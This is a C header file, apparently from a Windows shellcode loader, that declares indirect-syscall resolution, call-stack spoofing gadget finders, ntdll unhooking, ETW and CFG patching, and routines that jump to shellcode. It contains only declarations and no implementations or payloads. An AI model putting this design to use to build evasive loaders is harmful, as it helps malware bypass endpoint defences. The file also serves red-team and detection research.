#pragma once
#pragma intrinsic(memset, memcpy, memcmp)
#include <winternl.h>
#include <intrin.h>

#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "common.h"
#include "structs.h"

#ifndef IS_ADDR_SAFE
#define IS_ADDR_SAFE(ptr, base, size) \
    ((ULONG_PTR)(ptr) >= (ULONG_PTR)(base) && (ULONG_PTR)(ptr) < ((ULONG_PTR)(base) + (size)))
#endif

#ifndef RBP_OFFSET_INVALID
#define RBP_OFFSET_INVALID 0xFFFFFFFFu
#endif

#define rand MyRand
#define srand MySrand

/*--------------------------------------------------------------------
  External ASM functions
--------------------------------------------------------------------*/
extern VOID Gate(WORD wSystemCall, PVOID pSyscallInst, PVOID pClean, PVOID pThunk);
extern PVOID SpoofCall(PSPOOFER pConfig);
extern PVOID SyscallWrapper();
extern VOID JumpToShellcode(PVOID target);
extern VOID CallShellcode(PVOID target);

/*--------------------------------------------------------------------
  Globals (defined in src/globals.c)
--------------------------------------------------------------------*/
extern unsigned long g_seed;

extern PVOID g_ntdllBase;
extern PVOID g_kernel32Base;
extern PVOID g_kernelBaseAddr;
extern PVOID g_returnAddress;
extern SW3_SYSCALL_LIST g_SyscallList;

extern PVOID g_pRandomSyscallGadget;
extern PVOID g_pStackGadget;
extern PVOID g_pThunkGadget;
extern PVOID frame_Root_Ntdll;
extern PVOID frame_Mid_Kernel; 
extern PVOID kernelFrameModuleBase; 
extern DWORD g_FirstFrameSize;
extern DWORD g_SecondFrameSize;
extern DWORD g_RbpPushOffset;
extern DWORD g_StackGadgetSize;
extern DWORD g_FirstFrameOffset;
extern DWORD g_SecondFrameOffset;
extern DWORD g_JmpRbxGadgetFrameSize;

/*--------------------------------------------------------------------
  SysWhispers3 / hashing
--------------------------------------------------------------------*/
DWORD64 djb2(PBYTE str);
DWORD64 djb2_w(PCWSTR str);
DWORD SW3_HashSyscall(PCSTR FunctionName);
BOOL SW3_PopulateSyscallList(PVOID ntdllBase);
DWORD SW3_GetSyscallNumber(DWORD FunctionHash);
PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash);

/*--------------------------------------------------------------------
  PE helpers / exports
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);
VOID VxInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
PVOID GetProcAddressByName(PVOID pModuleBase, DWORD64 dwHash);
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len);
void MySrand(unsigned long seed);
int MyRand();
/*--------------------------------------------------------------------
  Gadgets / unwind / stack spoofing
--------------------------------------------------------------------*/
PRUNTIME_FUNCTION VxLookupFunctionEntry(DWORD64 ControlPc, PVOID ImageBase);
DWORD CalculateFunctionStackSize(PVOID funcAddr, PVOID moduleBase);
DWORD GetRbpPushOffset(PVOID funcAddr, PVOID moduleBase, DWORD* outStackSize);
BOOL FindPushRbpFrame(PVOID moduleBase, PVOID* outFunction, DWORD* outFrameSize, DWORD* outRbpOffset);
BOOL FindPrologFrame(PVOID moduleBase, PVOID* outFunction, DWORD* outFrameSize, DWORD* outFpOffset);
PVOID FindAddRspGadget(PVOID pModuleBase, DWORD* outSize);
PVOID FindJmpRbxGadget(PVOID moduleBase,DWORD *size);
PVOID GetSyscallGadget(PVOID pModuleBase);
DWORD FindCallSiteOffset(PVOID funcAddr, PVOID moduleBase);
/*--------------------------------------------------------------------
  API spoofing (Desync)
--------------------------------------------------------------------*/
ULONG_PTR InvokeSpoofedApi(DWORD64 apiHash, UINT64 argCount, ...);
/*--------------------------------------------------------------------
  Payloads
--------------------------------------------------------------------*/
BOOL Payload();
BOOL CheckEnvironment();
BOOL UnhookNtdll(PVX_TABLE pVxTable);
BOOL IsNtdllTainted(PVX_TABLE pVxTable);
BOOL PatchEtw(PVX_TABLE pVxTable);
BOOL PatchCFG(PVX_TABLE pVxTable);
